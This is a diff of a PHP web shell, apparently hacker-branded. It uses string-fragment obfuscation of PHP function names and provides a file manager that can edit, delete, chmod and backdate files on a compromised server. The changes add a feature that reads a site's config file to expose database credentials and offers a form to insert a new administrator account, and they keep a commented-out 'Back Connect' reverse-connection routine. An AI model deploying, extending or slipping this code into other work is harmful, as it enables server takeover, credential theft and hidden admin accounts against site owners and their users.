-    //                         <input type="text" name="db_name" id="db_name" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" value="" />
-    //                         <label for="db_name" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">DB NAME</label>
-    //                     </div>
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
-    //                         <input type="text" name="db_user" id="db_user" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" value="" />
-    //                         <label for="db_user" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">DB USER</label>
-    //                     </div>
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
-    //                         <input type="text" name="db_pass" id="db_pass" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" value="" />
-    //                         <label for="db_pass" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">DB PASS</label>
-    //                     </div>
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
-    //                         <input type="text" name="db_pass" id="db_pass" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" value="" />
-    //                         <label for="db_pass" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">TABLE PREFIX</label>
-    //                     </div>
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
-    //                         <input type="text" name="admin_username" id="admin_username" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" placeholder="superadmin_example" />
-    //                         <label for="admin_username" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">Admin Username</label>
-    //                     </div>
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
-    //                         <input type="password" name="admin_password" id="admin_password" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" placeholder="nulz_example@1337" />
-    //                         <label for="admin_password" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">Admin Password</label>
-    //                     </div>
-    //                     <div class="relative z-0 md:w-2/4 w-full mb-5 group">
-    //                         <input type="email" name="admin_email" id="admin_email" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" placeholder="nulz404@fbi.gov" />
-    //                         <label for="admin_email" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">Admin Email</label>
-    //                     </div>
-    //                     <button type="submit" class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm w-full sm:w-auto px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Submit</button>
-    //                  </form>';
-    //         } else {
-    //             echo '<span class="mx-4 mb-4 ubuntu-mono '.$txtYellow.'">Sorry... The Config Path <font class="'.$txtWhite.'">'.$config_path.'</font> Not Valid</span>';
-    //         }
-    //     }
-    // }
+                echo '<form class="md:w-2/4 w-full w-auto mx-4 my-8" action="" method="POST">
+                        <div class="relative z-0 md:w-2/4 w-full mb-5 group">
+                            <input type="text" name="db_host" id="db_host" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" value="'.getDbHost($config_content).'" />
+                            <label for="db_host" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">DB HOST</label>
+                        </div>
+                        <div class="relative z-0 md:w-2/4 w-full mb-5 group">
+                            <input type="text" name="db_name" id="db_name" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" value="'.getDbName($config_content).'" />
+                            <label for="db_name" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">DB NAME</label>
+                        </div>
+                        <div class="relative z-0 md:w-2/4 w-full mb-5 group">
+                            <input type="text" name="db_user" id="db_user" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" value="'.getDbUser($config_content).'" />
+                            <label for="db_user" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">DB USER</label>
+                        </div>
+                        <div class="relative z-0 md:w-2/4 w-full mb-5 group">
+                            <input type="text" name="db_pass" id="db_pass" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" value="'.getDbPassword($config_content).'" />
+                            <label for="db_pass" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">DB PASS</label>
+                        </div>
+                        <div class="relative z-0 md:w-2/4 w-full mb-5 group">
+                            <input type="text" name="db_prefix" id="db_prefix" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" value="'.getTablePrefix($config_content).'" />
+                            <label for="db_prefix" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">TABLE PREFIX</label>
+                        </div>
+                        <div class="relative z-0 md:w-2/4 w-full mb-5 group">
+                            <input type="text" name="admin_username" id="admin_username" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" placeholder="superadmin_example" />
+                            <label for="admin_username" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">Admin Username</label>
+                        </div>
+                        <div class="relative z-0 md:w-2/4 w-full mb-5 group">
+                            <input type="password" name="admin_password" id="admin_password" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" placeholder="nulz_example@1337" />
+                            <label for="admin_password" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">Admin Password</label>
+                        </div>
+                        <div class="relative z-0 md:w-2/4 w-full mb-5 group">
+                            <input type="email" name="admin_email" id="admin_email" class="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent placeholder:text-transparent border-0 border-b-2 border-gray-300 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 focus:placeholder:text-slate-500 peer" placeholder="nulz404@fbi.gov" />
+                            <label for="admin_email" class="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">Admin Email</label>
+                        </div>
+                        <button type="submit" name="addadmin" class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm w-full sm:w-auto px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Add Admin</button>
+                     </form>';
+            } else {
+                echo '<span class="mx-4 mb-4 ubuntu-mono '.$txtYellow.'">Sorry... The Config Path <font class="'.$txtWhite.'">'.$config_path.'</font> Not Valid</span>';
+            }
+        }
+    }
+
     if (isset($_GET['backConnect'])) {
         echo '<span class="mx-4 mb-4 mt-4 ubuntu-mono '.$txtYellow.'">Sorry... The Feature <font class="'.$txtWhite.'">Back Connect</font> Is Maintance!</span>';
+        //Maintance Mode
         // if (isset($_POST['btn-bc'])) {
         //     $f_put = 'f'.'pu'.'ts';
         //     $f_get = 'f'.'ge'.'ts';
@@ -2121,7 +3725,7 @@ $path = str_replace("\\", "/", $path);
     if (isset($_GET['editfile'])) {
         $hayoloh = 'h'.'tm'.'ls'.'pe'.'cial'.'ch'.'ars';
         $b_name = 'b'.'as'.'en'.'am'.'e';
-        $f_get = 'f'.'il'.'e'.'_'.'g'.'e'.'t'.'_'.'co'.'nten'.'t'.'s';
+        $f_get = 'f'.'il'.'e'.'_'.'g'.'e'.'t'.'_'.'co'.'nt'.'en'.'t'.'s';
         $fo = "fop"."en";
         $fw = "fw"."r"."it"."e";
         $fc = 'fc'.'lo'.'s'.'e';
@@ -2848,48 +4452,28 @@ $path = str_replace("\\", "/", $path);
             }
     }
         ?>
-        <div class="container px-2 py-2 w-full">
-            <?php
+    <div class="container px-2 py-2 max-w-full -full">
+        <?php
             $scn_d = 'sc'.'an'.'d'.'ir';
             $scan = $scn_d($path);
             ?>
-            <table
-                class="border-separate border-spacing-2 border border-slate-500 whitespace-nowrap w-full table-auto md:table-auto">
-                <thead>
-                    <tr>
-                        <th class="border border-slate-600 <?= $txtWhite ?>">Name</th>
-                        <th class="border border-slate-600 <?= $txtWhite ?>">Last Modified</th>
-                        <th class="border border-slate-600 <?= $txtWhite ?>">Size</th>
-                        <th class="border border-slate-600 <?= $txtWhite ?>">Owner/Group</th>
-                        <th class="border border-slate-600 <?= $txtWhite ?>">Permission</th>
-                        <th class="border border-slate-600 <?= $txtWhite ?>">Actions</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <?php
-                    //DIR
-                    // $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
-                    // $psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
-                    // $psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
-                    // $psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
-                    // $psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
-                    // $myuid = 'g'.'et'.'my'.'ui'.'d';
-                    // $mygid = 'g'.'et'.'my'.'gi'.'d';
-                    // $cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
-                    // $own_f = 'fi'.'le'.'ow'.'n'.'er';
-                    // $grp_f = 'fi'.'le'.'gr'.'ou'.'p';
-                    // if (!$func_exist($psx_egid)) {
-                    //     $d_user = $func_exist($own_f) ? @$own_f("$path/$dir") : "????";
-                    //     $d_group = $func_exist($grp_f) ? @$grp_f("$path/$dir") : "????";
-                    // } else {
-                    //     $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$own_f("$path/$dir") : array("name" => "????");
-                    //     $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$grp_f("$path/$dir") : array("name" => "????");
-                    //     $d_user = $uid['name'] ? $uid['name'] : ($func_exist($own_f)?@$own_f("$path/$dir"):"????");
-                    //     $d_group = $gid['name'] ? $gid['name'] : ($func_exist($grp_f)?@$grp_f("$path/$dir"):"????");
-                    // }
+        <table
+            class="border-separate border-spacing-2 border border-slate-500 whitespace-nowrap max-w-full w-full table-auto md:table-auto">
+            <thead>
+                <tr>
+                    <th class="border border-slate-600 <?= $txtWhite ?>">Name</th>
+                    <th class="border border-slate-600 <?= $txtWhite ?>">Last Modified</th>
+                    <th class="border border-slate-600 <?= $txtWhite ?>">Size</th>
+                    <th class="border border-slate-600 <?= $txtWhite ?>">Owner/Group</th>
+                    <th class="border border-slate-600 <?= $txtWhite ?>">Permission</th>
+                    <th class="border border-slate-600 <?= $txtWhite ?>">Actions</th>
+                </tr>
+            </thead>
+            <tbody>
+                <?php
                     echo "<tr><td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='".$folderIcon."'>&nbsp;<a class='font-bold " . $txtOrange . "' href='?path=".$path."'>.</a></td>";
                     echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center>--</center></td>";
-                    echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--DIR--</center></td>";
+                    echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--</center></td>";
                     echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>--</center></td>";
                     echo "<td class='whitespace-nowrap'><center><a href='?option&path=".$path."&permission=".$dir."'>";
                     $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
@@ -2903,14 +4487,18 @@ $path = str_replace("\\", "/", $path);
                     if ($is_w("$path/$dir") || !$is_r("$path/$dir"))
                         echo '</font></a></center></td>';
                     echo "<td><center>"; ?>
-                    <a href="?option&path=<?= $path ?>&newfolder"><button type="button" name="newfolder" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i class="fa-duotone fa-folder-plus"></i></button>
-                    <a href="?option&path=<?= $path ?>&newfiles"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-neutral-200 dark:focus:ring-neutral-400 hover:bg-neutral-400"><i class="fa-duotone fa-file-plus"></i></button>
-                    <?php
+                <a href="?option&path=<?= $path ?>&newfolder"><button type="button" name="newfolder"
+                        class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i
+                            class="fa-duotone fa-folder-plus"></i></button>
+                    <a href="?option&path=<?= $path ?>&newfiles"><button type="button" name="newfiles"
+                            class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-neutral-200 dark:focus:ring-neutral-400 hover:bg-neutral-400"><i
+                                class="fa-duotone fa-file-plus"></i></button>
+                        <?php
                     echo "</center></td></tr>";
                     $d_name = 'di'.'rn'.'am'.'e';
                     echo "<tr><td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='".$folderIcon."'>&nbsp;<a class='font-bold " . $txtOrange . "' href='?path=".$d_name($path)."'>..</a></td>";
                     echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center>--</center></td>";
-                    echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--DIR--</center></td>";
+                    echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--</center></td>";
                     echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>--</center></td>";
                     echo "<td class='whitespace-nowrap'><center><a href='?option&path=".$path."&permission=".$dir."'>";
                     $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
@@ -2924,9 +4512,13 @@ $path = str_replace("\\", "/", $path);
                     if ($is_w("$path/$dir") || !$is_r("$path/$dir"))
                         echo '</font></a></center></td>';
                     echo "<td><center>"; ?>
-                    <a href="?option&path=<?= $path ?>&newfolder"><button type="button" name="newfolder" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i class="fa-duotone fa-folder-plus"></i></button>
-                    <a href="?option&path=<?= $path ?>&newfiles"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-neutral-200 dark:focus:ring-neutral-400 hover:bg-neutral-400"><i class="fa-duotone fa-file-plus"></i></button>
-                    <?php
+                        <a href="?option&path=<?= $path ?>&newfolder"><button type="button" name="newfolder"
+                                class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i
+                                    class="fa-duotone fa-folder-plus"></i></button>
+                            <a href="?option&path=<?= $path ?>&newfiles"><button type="button" name="newfiles"
+                                    class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-neutral-200 dark:focus:ring-neutral-400 hover:bg-neutral-400"><i
+                                        class="fa-duotone fa-file-plus"></i></button>
+                                <?php
                     echo "</center></td></tr>";
                     foreach ($scan as $dir) {
                         if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
@@ -2942,17 +4534,20 @@ $path = str_replace("\\", "/", $path);
                         $cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
                         $own_f = 'fi'.'le'.'ow'.'n'.'er';
                         $grp_f = 'fi'.'le'.'gr'.'ou'.'p';
-                        if (!$func_exist($psx_egid)) {
-                            $d_user = $func_exist($own_f) ? @$own_f("$path/$dir") : "????";
-                            $d_group = $func_exist($grp_f) ? @$grp_f("$path/$dir") : "????";
-                        } else {
-                            $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$own_f("$path/$dir") : array("name" => "????");
-                            $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$grp_f("$path/$dir") : array("name" => "????");
-                            $d_user = $uid['name'] ? $uid['name'] : ($func_exist($own_f)?@$own_f("$path/$dir"):"????");
-                            $d_group = $gid['name'] ? $gid['name'] : ($func_exist($grp_f)?@$grp_f("$path/$dir"):"????");
+                        if($func_exist($psx_usr_uid)) {
+                            $d_user = @$psx_usr_uid($own_f("$path/$dir"));
+                            $d_user = $d_user['name'];
+                        }else{
+                            $d_user = $own_f("$path/$dir");
+                        }
+                        if($func_exist($psx_grp_gid)) {
+                            $d_group = @$psx_grp_gid($grp_f("$path/$dir"));
+                            $d_group = $d_group['name'];
+                        }else{
+                            $d_group = $grp_f("$path/$dir");
                         }
                         echo "<tr>";
-                        echo "<td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='".$folderIcon."'>&nbsp;<a class='font-bold " . $txtOrange . "' href='?path=".$path.'/'.$dir."'>$dir</a></td>";
+                        echo "<td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='".$folderIcon."'>&nbsp;<a id='thisFolderList' class='font-bold " . $txtOrange . "' href='?path=".$path.'/'.$dir."'>$dir</a></td>";
                         echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center><a href='?option&path=".$path."&changedate=".$dir."'>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "</a></center></td>";
                         echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--DIR--</center></td>";
                         echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $d_user . "/" . $d_group . "</center></td>";
@@ -2969,12 +4564,12 @@ $path = str_replace("\\", "/", $path);
                             echo '</font></a></center></td>';
                         echo "<td><center>";
                         ?>
-                    <div class="flex justify-center items-center flex-row flex-nowrap whitespace-nowrap">
-                    <a href="?option&path=<?= $path ?>&rename=<?=$dir?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-sky-200 dark:focus:ring-sky-900 hover:bg-sky-800"><i class="fa-sharp fa-regular fa-pencil"></i></button></a>
-                    <a href="?option&path=<?= $path ?>&permission=<?=$dir?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-yellow-300 dark:focus:ring-yellow-700 hover:bg-yellow-600"><i class="fa-regular fa-user-pen"></i></button></a>
-                    <a href="?option&path=<?= $path ?>&deletedir=<?=$dir?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-red-200 dark:focus:ring-red-900 hover:bg-red-800"><i class="fa-regular fa-trash-can-xmark"></i></button></a>
-                    </div>
-                    <?php
+                                <div class="flex justify-center items-center flex-row flex-nowrap whitespace-nowrap">
+                                    <a href="?option&path=<?= $path ?>&rename=<?=$dir?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-sky-200 dark:focus:ring-sky-900 hover:bg-sky-800"><i class="fa-sharp fa-regular fa-pencil"></i></button></a>
+                                    <a href="?option&path=<?= $path ?>&permission=<?=$dir?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-yellow-300 dark:focus:ring-yellow-700 hover:bg-yellow-600"><i class="fa-regular fa-user-pen"></i></button></a>
+                                    <a href="?option&path=<?= $path ?>&deletedir=<?=$dir?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-red-200 dark:focus:ring-red-900 hover:bg-red-800"><i class="fa-regular fa-trash-can-xmark"></i></button></a>
+                                </div>
+                                <?php
                         echo "</center></td></tr>";
                     } 
                     //FILE
@@ -3003,17 +4598,20 @@ $path = str_replace("\\", "/", $path);
                         $cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
                         $own_f = 'fi'.'le'.'ow'.'n'.'er';
                         $grp_f = 'fi'.'le'.'gr'.'ou'.'p';
-                        if (!$func_exist($psx_egid)) {
-                            $f_user = $func_exist($own_f) ? @$own_f("$path/$file") : "????";
-                            $f_group = $func_exist($grp_f) ? @$grp_f("$path/$file") : "????";
-                        } else {
-                            $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$own_f("$path/$file") : array("name" => "????");
-                            $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$grp_f("$path/$file") : array("name" => "????");
-                            $f_user = $uid['name'] ? $uid['name'] : ($func_exist($own_f)?@$own_f("$path/$file"):"????");
-                            $f_group = $gid['name'] ? $gid['name'] : ($func_exist($grp_f)?@$grp_f("$path/$file"):"????");
+                        if($func_exist($psx_usr_uid)) {
+                            $f_user = @$psx_usr_uid($own_f("$path/$file"));
+                            $f_user = $f_user['name'];
+                        }else{
+                            $f_user = $own_f("$path/$file");
+                        }
+                        if($func_exist($psx_grp_gid)) {
+                            $f_group = @$psx_grp_gid($grp_f("$path/$file"));
+                            $f_group = $f_group['name'];
+                        }else{
+                            $f_group = $grp_f("$path/$file");
                         }
                         echo "<tr>";
-                        echo "<td class='whitespace-nowrap flex flex-row'><img src='".$filesIcon."'>&nbsp;<a class=\"$txtWhite\" href=\"?option&path=$path&editfile=$file\">$file</a></td>";
+                        echo "<td class='whitespace-nowrap flex flex-row'><img src='".$filesIcon."'>&nbsp;<a id='thisFileList' class=\"$txtWhite\" href=\"?option&path=$path&editfile=$file\">$file</a></td>";
                         echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center><a href='?option&path=".$path."&changedate=".$file."'>" . date("d-M-Y H:i", $f_time("$path/$file")) . "</a></center></td>";
                         echo "<td class='whitespace-nowrap " . $txtRose . "'><center>" . $size . "</center></td>";
                         echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $f_user . "/" . $f_group . "</center></td>";
@@ -3029,20 +4627,54 @@ $path = str_replace("\\", "/", $path);
                             echo '</font></a></center></td>';
                         echo "<td><center>";
                         ?>
-                    <div class="flex justify-center items-center flex-row flex-nowrap whitespace-nowrap">
-                    <a href="?option&path=<?= $path ?>&editfile=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-emerald-200 dark:focus:ring-emerald-900 hover:bg-emerald-800"><i class="fa-sharp fa-regular fa-file-pen"></i></button></a>
